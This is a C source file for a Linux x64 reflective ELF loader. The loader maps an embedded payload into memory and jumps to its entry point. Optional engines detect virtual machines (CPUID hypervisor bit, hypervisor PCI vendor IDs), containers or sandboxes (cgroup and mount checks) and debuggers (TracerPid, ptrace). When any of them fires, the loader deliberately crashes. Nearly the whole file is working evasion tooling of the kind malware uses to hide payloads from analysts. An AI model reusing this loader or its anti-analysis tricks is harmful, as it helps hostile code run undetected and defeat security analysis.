/*=====================================*/
// [ OWNER ]
//     CREATOR  : Vladislav Khudash
//     AGE      : 17
//     LOCATION : Ukraine
//
// [ PINFO ]
//     DATE     : 01.08.2026
//     PROJECT  : REFLECTIVE-ELF-LOADER
//     PLATFORM : LIN64
/*=====================================*/




/* GitHub: https://github.com/vk-candpython/elfldr


REQUIREMENTS (
    Сompiler : GCC
    Support  : Linux x64 (ELF64)
)


https://github.com/vk-candpython/elfldr/blob/main/loader.h

INTERNAL LOADER DECLARATIONS */
#include "loader.h"
#include "payload.h"



/* Compile-time validation of feature flags */

#define _FLAG_IS_BOOLEAN(flg) _Static_assert(                     \
    ((flg) == FALSE) || ((flg) == TRUE),                          \
    "Build flag: '" #flg "', must be either (FALSE) or (TRUE)"    \
)


_FLAG_IS_BOOLEAN(  USING_ANTI_VM            );
_FLAG_IS_BOOLEAN(  USING_ANTI_SANDBOX       );
_FLAG_IS_BOOLEAN(  USING_ANTI_DEBUG         );
_FLAG_IS_BOOLEAN(  USING_ERASE_ELF_HEADERS  );


#undef _FLAG_IS_BOOLEAN




/* Terminate current process with status code,
   Uses only in LOADER-ENTRY-POINT
   (_StatusExit & _exit) */
#define EXIT(status) do {            \
    _StatusExit = (LONG)(status);    \
    goto _exit;                      \
} while (0)




/* Calculate virtual address bounds
   across loadable segments */
DEC_FUNC(VOID) SetElfVA(
    const Elf64_Half      e_phnum,
    CONST_PTR(Elf64_Phdr) Phdr,
    RESTR_PTR(Elf64_VA)   elfVA
) {
    FOR_LIKE (Elf64_Half i = 0,  i < e_phnum,  i++) {
        CONST_PTR(Elf64_Phdr) seg = &Phdr[i];

        const Elf64_Word  p_type  = seg->p_type;
        const Elf64_Addr  p_vaddr = seg->p_vaddr;
        const Elf64_Xword p_memsz = seg->p_memsz;

        IF_UNLIKE ((p_type != PT_LOAD) || !p_memsz)
            continue;


        const Elf64_Addr end_va = p_vaddr + p_memsz;

        IF_LIKE (elfVA->min_va > p_vaddr)
            elfVA->min_va = p_vaddr;

        IF_LIKE (elfVA->max_va < end_va)
            elfVA->max_va = end_va;
    }
}


/* Parse and map ELF program segments */
DEC_FUNC(BOOLEAN) MapElfImage(
    RESTR_PTR(Elf64_Addr) BaseAddr,
    CONST_PTR(BYTE)       buf,
    CONST_PTR(Elf64_Ehdr) Ehdr,
    CONST_PTR(Elf64_Phdr) Phdr
) {
    /* Segment permission lookup table */
    const BYTE ProtTab[] = {
        PROT_NONE,          PROT_EXEC,
        PROT_WRITE,         PROT_WRITE_EXEC,
        PROT_READ,          PROT_READ_EXEC,
        PROT_READ_WRITE,    PROT_READ_WRITE_EXEC
    };


    Elf64_VA elfVA = {.min_va = ~0,  .max_va = 0};
    SetElfVA(Ehdr->e_phnum, Phdr, &elfVA);

    const Elf64_Xword algMsk  = (Elf64_Xword)(MAP_PAGE_SIZE - 1);
    const Elf64_Addr  baseVA  = ALIGN_DOWN(elfVA.min_va, algMsk);
    const Elf64_Xword totalSz = ALIGN_UP(  elfVA.max_va, algMsk) - baseVA;


    Elf64_Addr LoadBase = 0;

    /* Reserve address space for PIE */
    IF_LIKE (Ehdr->e_type == ET_DYN) {
        CONST_PTR(VOID) hint = (VOID*)mmap(
            NULL, totalSz,
            PROT_NONE,
            MAP_PRIVATE|MAP_ANONYMOUS,
            MAP_NO_FD, MAP_NO_OFFSET
        );
        IF_SYSFAIL (hint) return FALSE;

        LoadBase = (Elf64_Addr)hint - baseVA;
    }


    FOR_LIKE (Elf64_Half i = 0,  i < Ehdr->e_phnum,  i++) {
        CONST_PTR(Elf64_Phdr) seg = &Phdr[i];

        const Elf64_Word  p_type  = seg->p_type;
        const Elf64_Xword p_memsz = seg->p_memsz;

        IF_UNLIKE ((p_type != PT_LOAD) || !p_memsz)
            continue;

        const Elf64_Word  p_flags  = seg->p_flags;
        const Elf64_Off   p_offset = seg->p_offset;
        const Elf64_Addr  p_vaddr  = seg->p_vaddr + LoadBase;
        const Elf64_Xword p_filesz = seg->p_filesz;


        const Elf64_Addr  pg_addr = ALIGN_DOWN(p_vaddr, algMsk);
        const Elf64_Xword pg_len  = ALIGN_UP(p_vaddr + p_memsz, algMsk) - pg_addr;

        /* Map segment into memory */
        IF_SYSFAIL (mmap(
            pg_addr, pg_len,
            PROT_READ_WRITE,
            MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
            MAP_NO_FD, MAP_NO_OFFSET
        )) return FALSE;


        /* Copy segment data to image */
        IF_LIKE (p_filesz)
            MEMCPY(p_vaddr, RVA(VOID*, buf, p_offset), p_filesz);

        /* Zero out the rest of the segment */
        IF_UNLIKE (p_memsz > p_filesz)
            ZEROS(p_vaddr + p_filesz, p_memsz - p_filesz);


        const BYTE idx = SEGMENT_PROT_IDX(p_flags);

        /* Apply protection to segment */
        IF_SYSFAIL (mprotect(pg_addr, pg_len, ProtTab[idx]))
            return FALSE;
    }


    /* Store image load base address */
    *BaseAddr = LoadBase;
    return TRUE;
}






/* Anti-VM Engine:
   Returns TRUE if virtual machine is DETECTED */
#if (USING_ANTI_VM)
DEC_FUNC(BOOLEAN) AntiVM(VOID) {
    BOOLEAN is_VM = TRUE;
    LONG    DirFd = MAP_NO_FD;

{//* CPUID
    BOOLEAN hypervisor;

    DEC_ASM (
        "movl $1, %%eax\n\t" // 1. Set CPUID function 1 (Processor Info)
        "cpuid\n\t"          // 2. Execute CPUID (fills EAX, EBX, ECX, EDX)
        "btl $31, %%ecx\n\t" // 3. Bit test bit 31 (Hypervisor Present Bit)

        : "=@ccc"(hypervisor)
        : : "rax", "rbx", "rcx", "rdx"
    );

    IF_UNLIKE (hypervisor) goto _ret;
}//* CPUID

{//* PCIVEN
    CHAR PciPath[PCI_SYS_PATH_LEN];
    PCI_INIT_SYS_PATH(PciPath);

    DirFd = open(PciPath, O_RDONLY|O_DIRECTORY);
    /* Assume VM if PCI directory cannot be opened */
    IF_SYSFAIL (DirFd) goto _ret;


    const UINT64 ConfigSuff = PCI_CONFIG_SUFF;
    CHAR CfgPath[PCI_ID_LEN + sizeof(ConfigSuff)];

    UINT16 vendorID;

    CHAR DEC_ALIGN_BUF buf[PCI_BUF_SIZE];
    LONG bln;


    WHILE_LIKE ((bln = getdents64(DirFd, buf, sizeof(buf))) > 0)
    {//* while getdents64
    const CHAR     *pCur = buf;
    CONST_PTR(CHAR) pEnd = buf + bln;

    /* Parse directory entries */
    WHILE_LIKE (pCur < pEnd) {
        CONST_PTR(struct linux_dirent64) ent = (struct linux_dirent64*)pCur;

        pCur += ent->d_reclen;

        /* Skip non-matching DBDF sizes */
        IF_UNLIKE (ent->d_reclen < PCI_ID_ENTRY_SZ)
            continue;


        /* Construct PCI device config path,
           Example: "0000:00:00.0/config\0" */
        MEMCPY(CfgPath,              ent->d_name, PCI_ID_LEN        );
        MEMCPY(CfgPath + PCI_ID_LEN, &ConfigSuff, sizeof(ConfigSuff));


        const LONG CfgFd = openat(DirFd, CfgPath, O_RDONLY);
        IF_SYSFAIL (CfgFd) continue;

        /* Read Vendor ID from the start of PCI config space */

        const LONG rd = read(CfgFd, &vendorID, sizeof(vendorID));
        close(CfgFd);


        /* Match known VM vendor IDs */
        IF_LIKE (rd == sizeof(vendorID)) switch (vendorID) {
            case PCI_VENID_VBOX      :
            case PCI_VENID_VMWARE    :

            case PCI_VENID_QEMU      :
            case PCI_VENID_QEMU_BRG  :
            case PCI_VENID_QEMU_VGA  :

            case PCI_VENID_XEN       :
            case PCI_VENID_HYPER_V   :
            case PCI_VENID_PARALLELS :
            /* VM vendor is detected */
                goto _ret;
        }
    }
    }//* end of while getdents64
}//* PCIVEN

/* VM is not detected */
is_VM = FALSE;

_ret:
    IF_LIKE (DirFd > MAP_NO_FD) close(DirFd);
    return is_VM;
}
#endif




/* Anti-SandBox Engine:
   Returns TRUE if sandbox is DETECTED */
#if (USING_ANTI_SANDBOX)
DEC_FUNC(BOOLEAN) AntiSandBox(VOID) {
    BOOLEAN is_SANDBOX = TRUE;
    CHAR buf[BUF_SIZE_1KB];

{//* CGROUP
    CHAR CgroupPath[SANDBOX_CGROUP_PATH_LEN];
    SANDBOX_INIT_CGROUP_PATH(CgroupPath);

    const LONG fd = open(CgroupPath, O_RDONLY);
    IF_SYSFAIL (fd) goto _ret;

    /* Read prefix + 1 byte to ensure
       (buf + 1) is always valid */
    read(fd, buf, sizeof(SANDBOX_CGROUP_INIT_PREF) + 1);
    close(fd);


    /* Verify PID 1 cgroup v2 path matches host systemd pattern:
       "::/init." – marks the init.scope reserved for the host is PID 1,
       Any other layout indicates a container runtime */
    IF_UNLIKE (*(UINT64*)(buf + 1) != SANDBOX_CGROUP_INIT_PREF)
        goto _ret;
}//* CGROUP

{//* MOUNTS
    CHAR MountsPath[SANDBOX_MOUNTS_PATH_LEN];
    SANDBOX_INIT_MOUNTS_PATH(MountsPath);

    const LONG fd = open(MountsPath, O_RDONLY);
    IF_SYSFAIL (fd) goto _ret;

    const LONG rd = read(fd, buf, sizeof(buf) - 1);
    close(fd);

    IF_SYSFAIL (rd) goto _ret;
    buf[rd] = '\0';


    BOOLEAN FoundRoot = FALSE;
    const CHAR *pCurChr = buf;

    WHILE_LIKE (*pCurChr++) {
        const CHAR *nm = pCurChr - 1;

        /* Look for " / " which marks
           the root filesystem mountpoint */
        IF_LIKE (!((nm[1] == '/') && (nm[2] == ' ')))
            continue;


        /* Backtrack to the start of the line to find the device path */
        WHILE_LIKE ((nm > buf) && (*(nm - 1) != '\n')) --nm;

        /* Check if the device path begins with "/dev" */
        IF_UNLIKE (*(UINT32*)nm != SANDBOX_MOUNTS_DEV_PREF)
            goto _ret;

        FoundRoot = TRUE;
        break;
    }


    /* Fail-closed: missing root */
    IF_UNLIKE (!FoundRoot) goto _ret;
}//* MOUNTS

/* SANDBOX is not detected */
is_SANDBOX = FALSE;

_ret:
    return is_SANDBOX;
}
#endif




/* Anti-Debug Engine:
   Returns TRUE if debug/anomaly is DETECTED */
#if (USING_ANTI_DEBUG)
DEC_FUNC(BOOLEAN) AntiDebug(VOID) {
    BOOLEAN is_DEBUG = TRUE;

{//* STATUS
    CHAR StatusPath[DEBUG_STATUS_PATH_LEN];
    DEBUG_INIT_STATUS_PATH(StatusPath);

    const LONG fd = open(StatusPath, O_RDONLY);
    IF_SYSFAIL (fd) goto _ret;

    CHAR buf[BUF_SIZE_1KB];

    const LONG rd = read(fd, buf, sizeof(buf) - 1);
    close(fd);

    IF_SYSFAIL (rd) goto _ret;
    buf[rd] = '\0';


    BOOLEAN FoundTpid = FALSE;
    const CHAR *pCurChr = buf;

    WHILE_LIKE (*pCurChr++) {
        /* Match "\n[-1]T[0]racerP[6]id" token at line start */
        IF_UNLIKE (
            (*(pCurChr - 1) == '\n') &&
            (pCurChr[0] == 'T') && (pCurChr[6] == 'P')
        ) {
            pCurChr += DEBUG_STATUS_TRACERPID_OFFSET_SZ;

            /* Compare with ":\t0\n" to confirm TracerPid is zero */
            IF_UNLIKE (*(UINT32*)pCurChr != DEBUG_STATUS_TRACERPID_ZERO)
                goto _ret;

            FoundTpid = TRUE;
            break;
        }
    }


    /* Fail-closed: missing TracerPid */
    IF_UNLIKE (!FoundTpid) goto _ret;
}//* STATUS

{//* TRACEME
    const LONG req = ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    IF_SYSFAIL (req) goto _ret; // Debugging if req != 0
}//* TRACEME

/* DEBUGGER is not detected */
is_DEBUG = FALSE;

_ret:
    return is_DEBUG;
}
#endif




/*
/==================\
 LOADER-ENTRY-POINT
/==================\
*/
_GCC_ATTR(noreturn, visibility("hidden"))
VOID Main(RESTR_PTR(VOID) const _kernel_rsp) {
    EntryPoint_t *AddrOfEntryPoint;
    LONG _StatusExit = EXIT_CODE_SUCCESS;

#if (USING_ANTI_VM || USING_ANTI_SANDBOX || USING_ANTI_DEBUG)
{//* ANTI-ANALYSIS
    /* VSD - VM, SANDBOX, DEBUG */
    BOOLEAN DEC_ALIGN_BUF VSD[XMM_REGISTER_SIZE];
    const BOOLEAN *p = VSD; // Single +1 shift breaks alignment


#if (USING_ANTI_DEBUG)
    IF_LIKE (p == VSD) p += AntiDebug();
#endif

#if (USING_ANTI_SANDBOX)
    IF_LIKE (p == VSD) p += AntiSandBox();
#endif

#if (USING_ANTI_VM)
    IF_LIKE (p == VSD) p += AntiVM();
#endif


    /* Misalign pointer (p) on detection -> GP fault */
    DEC_ASM ("movaps %%xmm0, (%0)\n\t"
        : : "r"(p)
        : "memory", "cc", "xmm0"
    );
}//* ANTI-ANALYSIS
#endif

{//* MAIN
    CONST_PTR(Elf64_Ehdr) Ehdr = (Elf64_Ehdr*)ELF_PAYLOAD;
    CONST_PTR(Elf64_Phdr) Phdr = RVA(Elf64_Phdr*, ELF_PAYLOAD, Ehdr->e_phoff);



    Elf64_Addr LoadBase;

    IF_UNLIKE (!MapElfImage(&LoadBase, ELF_PAYLOAD, Ehdr, Phdr))
        EXIT(EXIT_CODE_ENOMEM);






    AddrOfEntryPoint = (EntryPoint_t*)(LoadBase + Ehdr->e_entry);
}//* MAIN

    /* Transfer control to the loaded executable */
    DEC_ASM (
        "movq %0, %%rsp\n\t" // 1. Restore pristine kernel stack (argc/argv/envp/auxv)
        "movq %1, %%rax\n\t" // 2. Load target image entry point address
        "jmpq *%%rax\n\t"    // 3. Jump to loaded image entry point

        : : "r"(_kernel_rsp), "r"(AddrOfEntryPoint)
        : "memory", "cc", "rax"
    );



_exit:
    _exit_group(_StatusExit);
}




/*
Kernel Entry Point:
  1. Initialize runtime environment
  2. Transfer control to loader entry point
*/
_GCC_ATTR(naked, noreturn, visibility("hidden"))
VOID _start(VOID) {
    DEC_ASM (
        "movq %%rsp, %%rdi\n\t"       // 1. Save pristine kernel stack (argc/argv/envp/auxv)

        "andq $-16, %%rsp\n\t"        // 2. Force 16-byte alignment
        "subq $8,   %%rsp\n\t"        // 3. ABI alignment for JMP (simulates CALL)

        "leaq Main(%%rip), %%rax\n\t" // 4. Load address of Main relative to RIP
        "jmpq *%%rax\n\t"             // 5. Absolute jump to Main

        : : : "memory", "cc", "rdi", "rax"
    );
    _UNREACHABLE;
}
